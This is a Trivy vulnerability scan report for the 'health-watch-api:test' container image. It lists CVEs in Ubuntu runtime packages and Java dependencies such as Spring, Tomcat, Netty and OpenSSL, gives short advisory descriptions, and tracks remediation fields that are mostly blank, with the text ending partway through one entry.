# Backend Image Vulnerability Report

## Scan Information

- Scan date: 2026-08-27
- Repository: health-watch
- Image: health-watch-api:test
- Image digest: sha256:3270d0e1c74f11c49204ce19fd22c251b01a99629bbfb7b9038ae8ead6fb5d25
- Git commit: Feat(CI Foundation): update trivy action fixed version
- Trivy version: 0.69.3
- Scanner command or workflow run: https://github.com/jgripe455679-student/health-watch/actions/runs/33035373147

## Summary

- Critical findings: 3
- High findings: 25
- Medium findings: 47
- Low findings: 29
- Fixed findings: 71
- Unfixed findings: 33
- Release decision: Pending review

## Findings

| Package | CVE | Severity | Installed version | Fixed version | Location | Status | Owner | Due date |
|---|---|---|---|---|---|---|---|---|
| bsdutils | CVE-2026-27456 | MEDIUM | 1:2.37.2-4ubuntu3.5 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| gcc-12-base | CVE-2022-27943 | LOW | 12.3.0-1ubuntu1~22.04.3 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| libattr1 | CVE-2026-54371 | MEDIUM | 1:2.5.1-1build1 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| libblkid1 | CVE-2026-27456 | MEDIUM | 2.37.2-4ubuntu3.5 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| libexpat1 | CVE-2025-66382 | MEDIUM | 2.4.7-1ubuntu0.7 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| libgcc-s1 | CVE-2022-27943 | LOW | 12.3.0-1ubuntu1~22.04.3 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| libgcrypt20 | CVE-2024-2236 | LOW | 1.9.4-3ubuntu3.2 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| libmount1 | CVE-2026-27456 | MEDIUM | 2.37.2-4ubuntu3.5 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| libncurses6 | CVE-2023-50495 | LOW | 6.3-2ubuntu0.2 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| libncursesw6 | CVE-2023-50495 | LOW | 6.3-2ubuntu0.2 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| libp11-kit0 | CVE-2026-13757 | MEDIUM | 0.24.0-6build1 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| libpcre2-8-0 | CVE-2022-41409 | LOW | 10.39-3ubuntu0.1 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| libsmartcols1 | CVE-2026-27456 | MEDIUM | 2.37.2-4ubuntu3.5 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| libssl3 | CVE-2026-63072 | MEDIUM | 3.0.2-0ubuntu1.26 | 3.0.2-0ubuntu1.29 | Ubuntu 22.04 runtime layer | fixed | Unassigned | TBD |
| libssl3 | CVE-2026-63076 | MEDIUM | 3.0.2-0ubuntu1.26 | 3.0.2-0ubuntu1.29 | Ubuntu 22.04 runtime layer | fixed | Unassigned | TBD |
| libssl3 | CVE-2026-54874 | LOW | 3.0.2-0ubuntu1.26 | 3.0.2-0ubuntu1.29 | Ubuntu 22.04 runtime layer | fixed | Unassigned | TBD |
| libssl3 | CVE-2026-63074 | LOW | 3.0.2-0ubuntu1.26 | 3.0.2-0ubuntu1.29 | Ubuntu 22.04 runtime layer | fixed | Unassigned | TBD |
| libssl3 | CVE-2026-75803 | LOW | 3.0.2-0ubuntu1.26 | 3.0.2-0ubuntu1.29 | Ubuntu 22.04 runtime layer | fixed | Unassigned | TBD |
| libstdc++6 | CVE-2022-27943 | LOW | 12.3.0-1ubuntu1~22.04.3 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| libsystemd0 | CVE-2026-40228 | LOW | 249.11-0ubuntu3.22 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| libtinfo6 | CVE-2023-50495 | LOW | 6.3-2ubuntu0.2 | None | Ubuntu 22.04 runtime layer | affected  | Unassigned | TBD |
| libudev1 | CVE-2026-40228 | LOW | 249.11-0ubuntu3.22 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| libuuid1 | CVE-2026-27456 | MEDIUM | 2.37.2-4ubuntu3.5 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| libzstd1 | CVE-2022-4899 | LOW | 1.4.8+dfsg-3build1 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| login | CVE-2023-29383 | LOW | 1:4.8.1-2ubuntu2.2 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| login | CVE-2024-56433 | LOW | 1:4.8.1-2ubuntu2.2 | None | Ubuntu 22.04 runtime layer |  affected | Unassigned | TBD |
| mount | CVE-2026-27456 | MEDIUM | 2.37.2-4ubuntu3.5 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| ncurses-base | CVE-2023-50495 | LOW | 6.3-2ubuntu0.2 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| ncurses-bin | CVE-2023-50495 | LOW | 6.3-2ubuntu0.2 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| openssl | CVE-2026-63072 | MEDIUM | 3.0.2-0ubuntu1.26 | 3.0.2-0ubuntu1.29 | Ubuntu 22.04 runtime layer | fixed | Unassigned | TBD |
| openssl | CVE-2026-63076 | MEDIUM | 3.0.2-0ubuntu1.26 | 3.0.2-0ubuntu1.29 | Ubuntu 22.04 runtime layer | fixed | Unassigned | TBD |
| openssl | CVE-2026-54874 | LOW | 3.0.2-0ubuntu1.26 | 3.0.2-0ubuntu1.29 | Ubuntu 22.04 runtime layer | fixed | Unassigned | TBD |
| openssl | CVE-2026-63074 | LOW | 3.0.2-0ubuntu1.26 | 3.0.2-0ubuntu1.29 | Ubuntu 22.04 runtime layer | fixed | Unassigned | TBD |
| openssl | CVE-2026-75803 | LOW | 3.0.2-0ubuntu1.26 | 3.0.2-0ubuntu1.29 | Ubuntu 22.04 runtime layer | fixed | Unassigned | TBD |
| p11-kit | CVE-2026-13757 | MEDIUM | 0.24.0-6build1 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| p11-kit-modules | CVE-2026-13757 | MEDIUM | 0.24.0-6build1 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| passwd | CVE-2023-29383 | LOW | 1:4.8.1-2ubuntu2.2 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| passwd | CVE-2024-56433 | LOW | 1:4.8.1-2ubuntu2.2 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| perl-base | CVE-2026-12087 | MEDIUM | 5.34.0-3ubuntu1.7 | 5.34.0-3ubuntu1.8 | Ubuntu 22.04 runtime layer | fixed | Unassigned | TBD |
| perl-base | CVE-2026-13221 | MEDIUM | 5.34.0-3ubuntu1.7 | 5.34.0-3ubuntu1.8 | Ubuntu 22.04 runtime layer | fixed | Unassigned | TBD |
| perl-base | CVE-2026-57432 | MEDIUM | 5.34.0-3ubuntu1.7 | 5.34.0-3ubuntu1.8 | Ubuntu 22.04 runtime layer | fixed | Unassigned | TBD |
| perl-base | CVE-2026-57433 | MEDIUM | 5.34.0-3ubuntu1.7 | 5.34.0-3ubuntu1.8 | Ubuntu 22.04 runtime layer | fixed | Unassigned | TBD |
| tar | CVE-2026-18477 | MEDIUM | 1.34+dfsg-1ubuntu0.1.22.04.6 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| tar | CVE-2026-18508 | MEDIUM | 1.34+dfsg-1ubuntu0.1.22.04.6 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| util-linux | CVE-2026-27456 | MEDIUM | 2.37.2-4ubuntu3.5 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| wget | CVE-2021-31879 | MEDIUM | 1.21.2-2ubuntu1.5 | None | Ubuntu 22.04 runtime layer | affected | Unassigned | TBD |
| ch.qos.logback:logback-core | CVE-2026-10532 | LOW | 1.5.32 | 1.5.34 | Java application layer | fixed | Unassigned | TBD |
| ch.qos.logback:logback-core | CVE-2026-9828 | LOW | 1.5.32 | 1.5.33 | Java application layer | fixed | Unassigned | TBD |
| com.fasterxml.jackson.core:jackson-core | GHSA-r7wm-3cxj-wff9 | HIGH | 2.21.2 | 2.18.8, 2.21.4 | Java application layer | fixed | Unassigned | TBD |
| com.fasterxml.jackson.core:jackson-databind | CVE-2026-54512 | HIGH | 2.15.2 | 2.18.8, 3.1.4, 2.21.4 | Java application layer | fixed | Unassigned | TBD |
| com.fasterxml.jackson.core:jackson-databind | CVE-2026-54513 | HIGH | 2.15.2 | 2.18.8, 2.21.4, 3.1.4 | Java application layer | fixed | Unassigned | TBD |
| com.fasterxml.jackson.core:jackson-databind | CVE-2026-54514 | MEDIUM | 2.15.2 | 2.18.8, 2.21.4, 3.1.4 | Java application layer | fixed | Unassigned | TBD |
| com.fasterxml.jackson.core:jackson-databind | CVE-2026-54515 | MEDIUM | 2.15.2 | 3.1.4, 2.18.9, 2.21.5, 2.22.1 | Java application layer | fixed | Unassigned | TBD |
| com.fasterxml.jackson.core:jackson-databind | CVE-2026-59888 | MEDIUM | 2.15.2 | 2.18.8, 2.21.4 | Java application layer | fixed  | Unassigned | TBD |
| com.google.protobuf:protobuf-java | CVE-2021-22569 | HIGH | 3.11.4 | 3.16.1, 3.18.2, 3.19.2 | Java application layer | fixed | Unassigned | TBD |
| com.google.protobuf:protobuf-java | CVE-2022-3509 | HIGH | 3.11.4 | 3.16.3, 3.19.6, 3.20.3, 3.21.7 | Java application layer | fixed | Unassigned | TBD |
| com.google.protobuf:protobuf-java | CVE-2022-3510 | HIGH | 3.11.4 | 3.16.3, 3.19.6, 3.20.3, 3.21.7 | Java application layer | fixed | Unassigned | TBD |
| com.google.protobuf:protobuf-java | CVE-2024-7254 | HIGH | 3.11.4 | 3.25.5, 4.27.5, 4.28.2 | Java application layer | fixed | Unassigned | TBD |
| com.google.protobuf:protobuf-java | CVE-2022-3171 | MEDIUM | 3.11.4 | 3.21.7, 3.20.3, 3.19.6, 3.16.3 | Java application layer | fixed | Unassigned | TBD |
| com.rabbitmq:amqp-client | CVE-2026-63337 | HIGH | 5.25.0 | 5.33.0 | Java application layer | fixed | Unassigned | TBD |
| com.rabbitmq:amqp-client | CVE-2026-69219 | HIGH | 5.25.0 | 5.33.1 | Java application layer | fixed | Unassigned | TBD |
| com.rabbitmq:amqp-client | CVE-2026-69220 | HIGH | 5.25.0 | 5.33.1 | Java application layer | fixed | Unassigned | TBD |
| com.rabbitmq:amqp-client | CVE-2026-63335 | MEDIUM | 5.25.0 | 5.31.0 | Java application layer | fixed | Unassigned | TBD |
| com.rabbitmq:amqp-client | CVE-2026-63336 | MEDIUM | 5.25.0 | 5.33.0 | Java application layer | fixed | Unassgined | TBD |
| com.rabbitmq:amqp-client | CVE-2026-61634 | LOW | 5.25.0 | 5.33.0 | Java application layer | fixed | Unassigned | TBD |
| io.micrometer:micrometer-core | CVE-2026-40983 | HIGH | 1.15.11 | 1.16.6, 1.15.12 | Java application layer | fixed | Unassigned | TBD |
| io.micrometer:micrometer-core | CVE-2026-40984 | HIGH | 1.15.11 | 1.16.6, 1.15.12 | Java application layer | fixed | Unassigned | TBD |
| io.netty:netty-codec | CVE-2026-42583 | HIGH | 4.1.132.Final | 4.1.133.Final | Java application layer | fixed | Unassigned | TBD |
| io.netty:netty-codec | CVE-2026-59901 | HIGH | 4.1.132.Final | 4.1.136.Final | Java application layer | fixed | Unassigned | TBD |
| io.netty:netty-handler | CVE-2026-44249 | HIGH | 4.1.132.Final | 4.2.15.Final, 4.1.135.Final | Java application layer | fixed | Unassigned | TBD |
| io.netty:netty-handler | CVE-2026-45416 | HIGH | 4.1.132.Final | 4.2.15.Final, 4.1.135.Final | Java application layer | fixed | Unassigned | TBD |
| io.netty:netty-handler | CVE-2026-50010 | HIGH | 4.1.132.Final | 4.2.15.Final, 4.1.135.Final | Java application layer | fixed | Unassigned | TBD |
| mysql:mysql-connector-java | CVE-2023-22102 | HIGH | 8.0.28 | None | Java application layer | affected | Unassigned | TBD | 
| org.apache.commons:commons-lang3 | CVE-2025-48924 | MEDIUM | 3.17.0 | 3.18.0 | Java application layer | fixed | Unassigned | TBD |
| org.apache.logging.log4j:log4j-api | CVE-2026-49844 | MEDIUM | 2.24.3 | 2.25.5, 2.26.1 | Java application layer | fixed | Unassigned | TBD |
| org.apache.tomcat.embed:tomcat-embed-core | CVE-2026-41293 | CRITICAL | 10.1.54 | 9.0.118, 10.1.55, 11.0.22 | Java application layer | fixed | Unassigned | TBD |
| org.apache.tomcat.embed:tomcat-embed-core | CVE-2026-43512 | CRITICAL | 10.1.54 | 9.0.118, 10.1.55, 11.0.22 | Java application layer | fixed | Unassigned | TBD |
| org.apache.tomcat.embed:tomcat-embed-core | CVE-2026-43515 | CRITICAL | 10.1.54 | 9.0.118, 10.1.55, 11.0.22 | Java application layer | fixed | Unassigned | TBD |
| org.apache.tomcat.embed:tomcat-embed-core | CVE-2026-41284 | HIGH | 10.1.54 | 9.0.118, 10.1.55, 11.0.22 | Java application layer | fixed | Unassigned | TBD |
| org.apache.tomcat.embed:tomcat-embed-core | CVE-2026-42498 | HIGH | 10.1.54 | 9.0.118, 10.1.55, 11.0.22 | Java application layer | fixed | Unassigned | TBD |
| org.apache.tomcat.embed:tomcat-embed-core | CVE-2026-43513 | HIGH | 10.1.54 | 9.0.118, 10.1.55, 11.0.22 | Java application layer | fixed | Unassigned | TBD |
| org.apache.tomcat.embed:tomcat-embed-core | CVE-2026-43514 | LOW | 10.1.54 | 9.0.118, 10.1.55, 11.0.22 | Java application layer | fixed | Unassigned | TBD |
| org.springframework.amqp:spring-amqp | CVE-2026-41701 | MEDIUM | 3.2.10 | 4.0.4, 3.2.11 | Java application layer | fixed | Unassigned | TBD |
| org.springframework.amqp:spring-amqp | CVE-2026-41714 | MEDIUM | 3.2.10 | 4.0.4, 3.2.11 | Java application layer | fixed | Unassigned | TBD |
| org.springframework.boot:spring-boot-autoconfigure | CVE-2026-41001 | MEDIUM | 3.5.14 | 4.0.7, 3.5.15 | Java application layer | fixed | Unassigned | TBD |
| org.springframework.data:spring-data-commons | CVE-2026-41695 | HIGH | 3.5.11 | 4.0.6, 3.5.12 | Java application layer | fixed | Unassigned | TBD |
| org.springframework.data:spring-data-commons | CVE-2026-41716 | HIGH | 3.5.11 | 4.0.6, 3.5.12 | Java application layer | fixed | Unassigned | TBD |
| org.springframework.data:spring-data-commons | CVE-2026-41711 | MEDIUM | 3.5.11 | 4.0.6, 3.5.12 | Java application layer | fixed | Unassigned | TBD |
| org.springframework.data:spring-data-commons | CVE-2026-41721 | MEDIUM | 3.5.11 | 4.0.6, 3.5.12 | Java application layer | fixed | Unassigned | TBD |
| org.springframework.data:spring-data-keyvalue | CVE-2026-41719 | MEDIUM | 3.5.11 | 4.0.6, 3.5.12 | Java application layer | fixed | Unassigned | TBD |
| org.springframework.retry:spring-retry | CVE-2026-41710 | MEDIUM | 2.0.12 | 2.0.13 | Java application layer | fixed | Unassigned | TBD |
| org.springframework.security:spring-security-web | CVE-2026-41706 | MEDIUM | 6.5.10 | 7.0.6, 6.5.11 | Java application layer | fixed | Unassigned | TBD |
| org.springframework.security:spring-security-web | CVE-2026-47838 | MEDIUM | 6.5.10 | 6.5.11 | Java application layer | fixed | Unassigned | TBD |
| org.springframework:spring-core | CVE-2026-41848 | LOW | 6.2.18 | 7.0.8, 6.2.19 | Java application layer | fixed | Unassigned | TBD |
| org.springframework:spring-expression | CVE-2026-41850 | HIGH | 6.2.18 | 7.0.8, 6.2.19 | Java application layer | fixed | Unassigned | TBD |
| org.springframework:spring-expression | CVE-2026-41851 | MEDIUM | 6.2.18 | 7.0.8, 6.2.19 | Java application layer | fixed | Unassigned | TBD |
| org.springframework:spring-expression | CVE-2026-41852 | LOW | 6.2.18 | 7.0.8, 6.2.19 | Java application layer | fixed | Unassigned | TBD |
| org.springframework:spring-web | CVE-2026-41854 | MEDIUM | 6.2.18 | 7.0.8, 6.2.19 | Java application layer | fixed | Unassigned | TBD |

| org.springframework:spring-webmvc | CVE-2026-41842 | HIGH | 6.2.18 | 7.0.8, 6.2.19 | Java application layer | fixed | Unassigned | TBD |
| org.springframework:spring-webmvc | CVE-2026-41845 | HIGH | 6.2.18 | 7.0.8, 6.2.19 | Java application layer | fixed | Unassigned | TBD |
| org.springframework:spring-webmvc | CVE-2026-41841 | MEDIUM | 6.2.18 | 7.0.8, 6.2.19 | Java application layer | fixed | Unassigned | TBD |
| org.springframework:spring-webmvc | CVE-2026-41843 | MEDIUM | 6.2.18 | 7.0.8, 6.2.19 | Java application layer | fixed | Unassigned | TBD |
| org.springframework:spring-webmvc | CVE-2026-41844 | MEDIUM | 6.2.18 | 7.0.8, 6.2.19 | Java application layer | fixed | Unassigned | TBD |
| org.springframework:spring-webmvc | CVE-2026-41846 | MEDIUM | 6.2.18 | 7.0.8, 6.2.19 | Java application layer | fixed | Unassigned | TBD |
| org.springframework:spring-webmvc | CVE-2026-41853 | MEDIUM | 6.2.18 | 7.0.8, 6.2.19 | Java application layer | fixed | Unassigned | TBD |

## Finding Details (Java application layer)

### <CVE-ID>: <short description>
          
- Package: <PkgName>
- Severity: <Severity>
- Installed version: <InstalledVersion>
- Fixed version: <FixedVersion or none>
- Location: Java application
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: <>
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

### CVE-2026-41842: Spring MVC and WebFlux applications are vulnerable to Denial of Service (DoS) attacks when resolving static resources.\n\nAffected versions:\nSpring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.
          
- Package: org.springframework:spring-webmvc
- Severity: HIGH
- Installed version: 6.2.18
- Fixed version: 7.0.8, 6.2.19
- Location: Java application
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2026-41845: Due to incorrect escaping, the use of JavaScriptUtils.javaScriptEscape() may lead to JavaScript code injection in the browser, potentially resulting in a cross-site scripting (XSS) vulnerability.\n\nAffected versions:\nSpring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.
          
- Package: org.springframework:spring-webmvc
- Severity: HIGH
- Installed version: 6.2.18
- Fixed version: 7.0.8, 6.2.19
- Location: Java application
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2026-41841: Spring MVC and WebFlux applications are vulnerable to Information Disclosure attacks when resolving static resources.\n\nAffected versions:\nSpring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.
          
- Package: org.springframework:spring-webmvc
- Severity: MEDIUM
- Installed version: 6.2.18
- Fixed version: 7.0.8, 6.2.19
- Location: Java application
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2026-41843: Spring MVC and WebFlux applications are vulnerable to Path Traversal attacks when resolving static resources.\n\nAffected versions:\nSpring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.
          
- Package: org.springframework:spring-webmvc
- Severity: MEDIUM
- Installed version: 6.2.18
- Fixed version: 7.0.8, 6.2.19
- Location: Java application
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2026-41844: A Spring MVC or Spring WebFlux application which configures a mapping for \"/**\" where the view name is not explicitly specified allows an attacker to craft a link resulting in a 302 redirect to an arbitrary external host via the redirect: prefix.\n\nAffected versions:\nSpring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.
          
- Package: org.springframework:spring-webmvc
- Severity: MEDIUM
- Installed version: 6.2.18
- Fixed version: 7.0.8, 6.2.19
- Location: Java application
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2026-41846: Spring MVC applications which accept user-supplied values in the cssClass, cssErrorClass, or cssStyle attributes of JSP form tags allow arbitrary HTML/JavaScript code injection, potentially resulting in a cross-site scripting (XSS) vulnerability.\n\nAffected versions:\nSpring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.
          
- Package: org.springframework:spring-webmvc
- Severity: MEDIUM
- Installed version: 6.2.18
- Fixed version: 7.0.8, 6.2.19
- Location: Java application
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2026-41853: Spring MVC and WebFlux applications are vulnerable to Multipart request smuggling attacks.\n\nAffected versions:\nSpring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.
          
- Package: org.springframework:spring-webmvc
- Severity: MEDIUM
- Installed version: 6.2.18
- Fixed version: 7.0.8, 6.2.19
- Location: Java application
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes: 

## Finding Details (Ubuntu 22.04 runtime)

### CVE-2026-27456: A TOCTOU race condition vulnerability exists in the SUID binary /usr/bin/mount from util-linux prior to version 2.41.4. When setting up loop devices, the binary validates a file path using user privileges but later opens it as root without ensuring the path has not changed. A local, unprivileged attacker with write access to an /etc/fstab user,loop target directory can exploit this by replacing the source file with a symlink. This allows them to mount and gain unauthorized read access to root-protected files, disk volumes, and block devices. The issue is resolved in version 2.41.4.

- Package: bsdutils, libblkid1, libmount1, libsmartcols1, libuuid1, mount, util-linux
- Severity: MEDIUM
- Installed version: 1:2.37.2-4ubuntu3.5, 2.37.2-4ubuntu3.5
- Fixed version: none, 2.41.4?
- Location: Ubuntu 22.04 runtime
- Exploitability: known
- Reachable at runtime: yes
- Trivy status: affected
- Security Disposition: open
- Remediation: upgrade, rebuild base image, and investigate
- Tracking issues: 
- Exception expiry: 
- Notes: 

### CVE-2022-27943: libiberty/rust-demangle.c in GNU GCC 11.2 allows stack consumption in demangle_const, as demonstrated by nm-new.

- Package: gcc-12-base, libgcc-s1, libstdc++6
- Severity: LOW
- Installed version: 12.3.0-1ubuntu1~22.04.3
- Fixed version: none
- Location: Ubuntu 22.04 runtime
- Exploitability: not currently exploitable
- Reachable at runtime: unknown
- Trivy status: LOW
- Security disposition: open
- Remediation: upgrade, rebuild base image, and investigate
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2026-54371: A symlink traversal vulnerability exists in the getfattr and setfattr utilities within attr prior to version 2.6.0. Local attackers who control a pathname component can replace it with a symbolic link during directory hierarchy traversal. This redirects getfattr and setfattr operations to arbitrary files, leading to local privilege escalation when a privileged process executes these utilities over the manipulated path.

- Package: libattr1
- Severity: MEDIUM
- Installed version: 1:2.5.1-1build1
- Fixed version: none
- Location: Ubuntu 22.04 runtime
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: affected
- Security Disposition: open
- Remediation: upgrade, rebuild base image, and investigate
- Tracking issue: 
- Exception expiry: 
- Notes: 

### <CVE-2025-66382>: <In libexpat through 2.7.3, a crafted file with an approximate size of 2 MiB can lead to dozens of seconds of processing time.>

- Package: libexpat1
- Severity: MEDIUM
- Installed version: 2.4.7-1ubuntu0.7
- Fixed version: none
- Location: Ubuntu 22.04 runtime
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: affected
- Security Disposition: open
- Remediation: upgrade, rebuild base image, and investigate
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2024-2236: A timing-based side-channel flaw was found in libgcrypt's RSA implementation. This issue may allow a remote attacker to initiate a Bleichenbacher-style attack, which can lead to the decryption of RSA ciphertexts.

- Package: libgcrypt20
- Severity: LOW
- Installed version: 1.9.4-3ubuntu3.2
- Fixed version: none
- Location: Ubuntu 22.04 runtime
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: affected
- Security Disposition: open
- Remediation: upgrade, rebuild base image, and investigate
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2023-50495: NCurse v6.4-20230418 was discovered to contain a segmentation fault via the component _nc_wrap_entry().

- Package: libncurses6, libncursesw6, libtinfo6, ncurses-base, ncurses-bin
- Severity: LOW
- Installed version: 6.3-2ubuntu0.2
- Fixed version: none
- Location: Ubuntu 22.04 runtime
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: affected
- Security Disposition: open
- Remediation: upgrade, rebuild base image, and investigate
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2026-13757: A stack exhaustion flaw exists in p11-kit due to unlimited mutual recursion between the RPC message attribute parsing functions p11_rpc_message_get_attribute() and p11_rpc_message_get_attribute_array_value(). An unauthenticated local attacker with access to the p11-kit RPC Unix domain socket can exploit this by sending a crafted request with deeply nested CKA_WRAP_TEMPLATE, CKA_UNWRAP_TEMPLATE, or CKA_DERIVE_TEMPLATE attributes. This triggers a crash of the p11-kit server process and its dependent services, resulting in a denial of service.

- Package: libp11-kit0, p11-kit, p11-kit-modules
- Severity: MEDIUM
- Installed version: 0.24.0-6build1
- Fixed version: none
- Location: Ubuntu 22.04 runtime
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: affected
- Security Disposition: open
- Remediation: upgrade, rebuild base image, and investigate
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2022-41409: Integer overflow vulnerability in pcre2test before 10.41 allows attackers to cause a denial of service or other unspecified impacts via negative input.

- Package: libpcre2-8-0
- Severity: LOW
- Installed version: 10.39-3ubuntu0.1
- Fixed version: none
- Location: Ubuntu 22.04 runtime
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: affected
- Security Disposition: open
- Remediation: upgrade package, rebuild base image, and investigate
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2026-63072>: An out-of-bounds heap write vulnerability (CWE-787) exists in OpenSSL's CMS decryption. The CMS_decrypt() function sizes its key-unwrap output buffer based on the reported key size, but the AES-WRAP-PAD primitive can write 8 additional bytes during a failed unwrap operation. An attacker can exploit this by modifying a single OID byte in a legitimate CMS message to force the padded variant. When processed, this triggers a deterministic, 8-byte zero-value heap overflow, causing heap corruption and a Denial of Service. FIPS modules are unaffected.

- Package: libssl3, openssl
- Severity: MEDIUM
- Installed version: 3.0.2-0ubuntu1.26
- Fixed version: 3.0.2-0ubuntu1.29
- Location: Ubuntu 22.04 runtime
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: upgrade, rebuild base image, and investigate
- Tracking issue: 
- Exception expiry: 
- Notes: 

### <CVE-2026-63076>: <OpenSSL CMP password based protection verification only\nchecks whether the protectionAlg parameter was not NULL and not its\nASN.1 type, before treating it as a PBMParameter.>

- Package: libssl3, openssl
- Severity: MEDIUM
- Installed version: 3.0.2-0ubuntu1.26
- Fixed version: 3.0.2-0ubuntu1.29
- Location: Ubuntu 22.04 runtime
- Exploitability: known
- Reachable at runtime: unknown
- Trivy Status: fixed
- Security Disposition: open
- Remediation: upgrade, rebuild base image, and investigate
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2026-54874: Receiving a DTLS record for a future epoch while a handshake\nis in progress causes OpenSSL to buffer far more memory than the record\nitself requires.

- Package: libssl3, openssl
- Severity: LOW
- Installed version: 3.0.2-0ubuntu1.26
- Fixed version: 3.0.2-0ubuntu1.29
- Location: Ubuntu 22.04 runtime
- Exploitability: known
- Reachable at runtime: unknown
- Trivy Status: fixed
- Security Disposition: open
- Remediation: investigate
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2026-63074: The OpenSSL Certificate Management Protocol (CMP) caches\nadditional certificates (extraCerts) sent in a CMP message, but never expunges\nthem (for instance if they are invalid).

- Package: libssl3, openssl
- Severity: LOW
- Installed version: 3.0.2-0ubuntu1.26
- Fixed version: 3.0.2-0ubuntu1.29
- Location: Ubuntu 22.04 runtime
- Exploitability: known
- Reachable at runtime: unknown
- Trivy Status: fixed
- Security Disposition: open
- Remediation: upgrade, rebuild base image, and investigate
- Tracking issue: 
- Exception expiry: 
- Notes: 

### CVE-2026-75803: The EVP_Cipher() API call for AEAD ciphers behaves like a one\nshot encryption and decryption call. It also verifies the AEAD tag after the\ndecryption operation. However for AES-OCB and ChaCha20-Poly1305 ciphers\nit skipped the AEAD tag verification when an empty ciphertext was passed to\nthe function. The callers of this function might believe that a successful\nreturn indicates a valid AEAD tag for these ciphers, even when that has not\ntruly been validated in this case.

- Package: libssl3, openssl
- Severity: LOW
- Installed version: 3.0.2-0ubuntu1.26
- Fixed version: 3.0.2-0ubuntu1.29
- Location: Ubuntu 22.04 runtime
- Exploitability: known
- Reachable at runtime: unknown
- Trivy Status: fixed
- Security Disposition: open
- Remediation: upgrade, rebuild base image, and investigate
- Tracking issue: 
- Exception expiry: 
- Notes: 

### <CVE-2026-40228>: <In systemd 259, systemd-journald can send ANSI escape sequences to the terminals of arbitrary users when a \"logger -p emerg\" command is executed, if ForwardToWall=yes is set.>

- Package: libsystemd0, libudev1
- Severity: LOW
- Installed version: 249.11-0ubuntu3.22
- Fixed version: none
